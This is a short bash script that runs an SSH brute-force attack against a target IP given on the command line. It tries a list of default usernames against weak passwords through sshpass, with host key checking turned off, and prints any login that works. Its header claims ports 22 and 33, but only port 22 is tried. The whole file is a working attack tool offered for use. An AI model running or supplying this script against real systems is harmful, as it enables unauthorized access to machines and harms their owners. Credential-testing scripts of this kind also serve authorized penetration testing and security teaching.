#!/bin/bash

# Simple SSH brute force script for ports 22 and 33
# Usage: ./attack.sh <target_ip>

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_ip>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

TARGET_IP=$1

# Common credentials to try
USERS=("root" "admin" "user" "test" "ubuntu")
PASSWORDS=("123456" "password" "admin" "root" "test")

echo "[INFO] Starting SSH brute force attack on $TARGET_IP"
echo "[INFO] Target ports: 22"

# Function to try SSH connection
try_ssh() {
    local ip=$1
    local port=$2
    local user=$3
    local pass=$4
    
    timeout 10 sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p $port $user@$ip "echo 'Success'" 2>/dev/null
    return $?
}

# Attack port 22
echo ""
echo "[ATTACK] Trying SSH on port 22..."
for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo -n "Trying $user:$pass... "
        if try_ssh $TARGET_IP 22 $user $pass; then
            echo "SUCCESS! Found credentials: $user:$pass on port 22"
            exit 0
        else
            echo "failed"
        fi
    done
done

echo ""
echo "[FAILED] No valid credentials found"